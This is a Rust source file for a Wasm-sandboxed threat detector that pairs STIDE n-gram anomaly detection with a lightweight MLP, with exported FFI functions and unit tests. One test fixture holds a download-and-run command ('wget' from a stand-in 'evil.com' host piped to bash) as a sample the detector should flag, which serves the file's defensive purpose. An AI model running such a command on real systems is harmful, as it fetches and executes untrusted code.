//! WasmML: Lightweight ML-based Threat Detection in Wasm Sandbox
//!
//! This module implements a hybrid detection strategy combining:
//! 1. STIDE (Sequence Time-Delay Embedding) for fast n-gram anomaly detection
//! 2. Lightweight MLP for deep pattern recognition
//!
//! Key Innovation: First system to run ML inference inside Wasm sandbox for
//! runtime threat detection, maintaining isolation while providing intelligent detection.

mod features;
mod hybrid;
mod mlp;
mod stide;
mod weights;

use serde::{Deserialize, Serialize};
use serde_json::Value;

// Re-exports for testing
pub use hybrid::HybridDetector;
pub use mlp::MlpDetector;
pub use stide::StideDetector;

/// Global detector instance
static mut DETECTOR: Option<HybridDetector> = None;

/// Event types supported by the detector
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type")]
pub enum Event {
    #[serde(rename = "process")]
    Process(ProcessEvent),
    #[serde(rename = "network")]
    Network(NetworkEvent),
    #[serde(rename = "file")]
    File(FileEvent),
    #[serde(rename = "syscall")]
    Syscall(SyscallEvent),
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessEvent {
    pub pid: u32,
    pub ppid: u32,
    pub uid: u32,
    pub executable: String,
    pub name: String,
    pub command_line: String,
    pub timestamp: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetworkEvent {
    pub pid: u32,
    pub src_ip: String,
    pub dest_ip: String,
    pub src_port: u16,
    pub dest_port: u16,
    pub protocol: String,
    pub direction: String,
    pub timestamp: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileEvent {
    pub pid: u32,
    pub path: String,
    pub operation: String,
    pub timestamp: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SyscallEvent {
    pub pid: u32,
    pub syscall_nr: u32,
    pub syscall_name: String,
    pub ret: i64,
    pub timestamp: u64,
}

/// Detection result with detailed information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DetectionResult {
    pub threat_level: i32,        // 0-10, 0 = no threat
    pub confidence: f32,          // 0.0-1.0
    pub detection_method: String, // "stide", "mlp", or "hybrid"
    pub anomaly_score: f32,       // Raw anomaly score
    pub details: String,          // Human-readable explanation
}

// ---------------------------------------------------------------------------
// Guest ABI v2: host-visible allocator.
//
// The host calls `alloc` once per rule instance to obtain an event buffer in
// linear memory, copies the serialized event into it and then calls
// `detect(ptr, len)`. The buffer is released with `dealloc` when the host grows
// it or drops the instance. Writing at a fixed offset (the pre-v2 behaviour)
// is no longer supported: it silently overlapped the shadow stack.
// ---------------------------------------------------------------------------

/// Allocate `size` bytes in linear memory and hand ownership to the host.
#[no_mangle]
pub extern "C" fn alloc(size: usize) -> *mut u8 {
    let mut buf = Vec::<u8>::with_capacity(size);
    let ptr = buf.as_mut_ptr();
    std::mem::forget(buf);
    ptr
}

/// Release a buffer previously returned by [`alloc`] with the same `size`.
///
/// # Safety
/// `ptr` must come from `alloc(size)` and must not be used afterwards.
#[no_mangle]
pub unsafe extern "C" fn dealloc(ptr: *mut u8, size: usize) {
    if !ptr.is_null() && size > 0 {
        drop(Vec::from_raw_parts(ptr, 0, size));
    }
}

/// Initialize the detector with optional model data
///
/// # Arguments
/// * `config_ptr` - Pointer to configuration JSON
/// * `config_len` - Length of configuration data
///
/// # Returns
/// * 0 on success, negative on error
#[no_mangle]
pub extern "C" fn init(config_ptr: *const u8, config_len: usize) -> i32 {
    let config_data = if config_ptr.is_null() || config_len == 0 {
        None
    } else {
        Some(unsafe { std::slice::from_raw_parts(config_ptr, config_len) })
    };

    let detector = match config_data {
        Some(data) => match serde_json::from_slice::<Value>(data) {
            Ok(config) => HybridDetector::from_config(&config),
            Err(_) => HybridDetector::new(),
        },
        None => HybridDetector::new(),
    };

    unsafe {
        DETECTOR = Some(detector);
    }

    0
}

/// Main detection function - analyzes event and returns threat level
///
/// # Arguments
/// * `event_ptr` - Pointer to event JSON data
/// * `event_len` - Length of event data
///
/// # Returns
/// * 0 - No threat detected
/// * 1-10 - Threat level (1=low, 10=critical)
/// * -1 - Error processing event
#[no_mangle]
pub extern "C" fn detect(event_ptr: *const u8, event_len: usize) -> i32 {
    // Safety check
    if event_ptr.is_null() || event_len == 0 {
        return 0;
    }

    let event_data = unsafe { std::slice::from_raw_parts(event_ptr, event_len) };

    // Parse event JSON
    let event: Value = match serde_json::from_slice(event_data) {
        Ok(e) => e,
        Err(_) => return -1,
    };

    // Get or create detector
    let detector = unsafe {
        if DETECTOR.is_none() {
            DETECTOR = Some(HybridDetector::new());
        }
        DETECTOR.as_mut().unwrap()
    };

    // Perform detection
    let result = detector.detect(&event);
    result.threat_level
}

/// Extended detection with detailed results
/// Returns a pointer to JSON result (caller must free)
#[no_mangle]
pub extern "C" fn detect_extended(
    event_ptr: *const u8,
    event_len: usize,
    result_len: *mut usize,
) -> *const u8 {
    if event_ptr.is_null() || event_len == 0 {
        return std::ptr::null();
    }

    let event_data = unsafe { std::slice::from_raw_parts(event_ptr, event_len) };

    let event: Value = match serde_json::from_slice(event_data) {
        Ok(e) => e,
        Err(_) => return std::ptr::null(),
    };

    let detector = unsafe {
        if DETECTOR.is_none() {
            DETECTOR = Some(HybridDetector::new());
        }
        DETECTOR.as_mut().unwrap()
    };

    let result = detector.detect(&event);

    // Serialize result to JSON
    let json = match serde_json::to_vec(&result) {
        Ok(j) => j,
        Err(_) => return std::ptr::null(),
    };

    unsafe {
        *result_len = json.len();
    }

    // Leak the memory (caller must free)
    let ptr = json.as_ptr();
    std::mem::forget(json);
    ptr
}

/// Train the detector with normal behavior data
///
/// # Arguments
/// * `data_ptr` - Pointer to training data (array of events)
/// * `data_len` - Length of training data
///
/// # Returns
/// * Number of samples trained on, or negative on error
#[no_mangle]
pub extern "C" fn train(data_ptr: *const u8, data_len: usize) -> i32 {
    if data_ptr.is_null() || data_len == 0 {
        return -1;
    }

    let data = unsafe { std::slice::from_raw_parts(data_ptr, data_len) };

    let events: Vec<Value> = match serde_json::from_slice(data) {
        Ok(e) => e,
        Err(_) => return -1,
    };

    let detector = unsafe {
        if DETECTOR.is_none() {
            DETECTOR = Some(HybridDetector::new());
        }
        DETECTOR.as_mut().unwrap()
    };

    detector.train(&events);
    events.len() as i32
}

/// Get detector statistics
#[no_mangle]
pub extern "C" fn get_stats(stats_len: *mut usize) -> *const u8 {
    let detector = unsafe {
        if DETECTOR.is_none() {
            DETECTOR = Some(HybridDetector::new());
        }
        DETECTOR.as_ref().unwrap()
    };

    let stats = detector.get_stats();
    let json = match serde_json::to_vec(&stats) {
        Ok(j) => j,
        Err(_) => return std::ptr::null(),
    };

    unsafe {
        *stats_len = json.len();
    }

    let ptr = json.as_ptr();
    std::mem::forget(json);
    ptr
}

/// Free memory allocated by the detector
#[no_mangle]
pub extern "C" fn free_result(ptr: *mut u8, len: usize) {
    if !ptr.is_null() && len > 0 {
        unsafe {
            let _ = Vec::from_raw_parts(ptr, len, len);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_init() {
        assert_eq!(init(std::ptr::null(), 0), 0);
    }

    #[test]
    fn test_detect_process() {
        // Use HybridDetector directly to avoid static mut issues in tests
        let mut detector = HybridDetector::new();

        let event = serde_json::json!({
            "type": "process",
            "data": {
                "process": {
                    "executable": "/bin/bash",
                    "name": "bash",
                    "command_line": "bash -c 'wget http://evil.com/malware.sh | bash'",
                    "uid": 0
                }
            }
        });

        let result = detector.detect(&event);
        assert!(result.threat_level > 0, "Should detect suspicious command");
    }

    #[test]
    fn test_detect_syscall_sequence() {
        let mut detector = HybridDetector::new();

        // Simulate a sequence of syscalls
        let syscalls = vec!["execve", "open", "read", "mmap", "mprotect", "write"];

        for (i, syscall) in syscalls.iter().enumerate() {
            let event = serde_json::json!({
                "type": "syscall",
                "pid": 1234,
                "syscall_nr": i,
                "syscall_name": syscall,
                "ret": 0,
                "timestamp": 1234567890 + i as u64
            });

            let _ = detector.detect(&event);
        }
    }

    #[test]
    fn test_stide_basic() {
        let mut stide = StideDetector::new();

        // Train on normal sequence
        for _ in 0..20 {
            stide.train_on("open");
            stide.train_on("read");
            stide.train_on("close");
        }
        stide.fit();

        assert!(stide.database_size() > 0, "Should have trained ngrams");
    }

    #[test]
    fn test_mlp_basic() {
        let mut mlp = MlpDetector::new();
        let features = vec![0.5; 64];
        let score = mlp.detect(&features);

        assert!(score >= 0.0 && score <= 1.0, "Score should be in [0, 1]");
    }
}
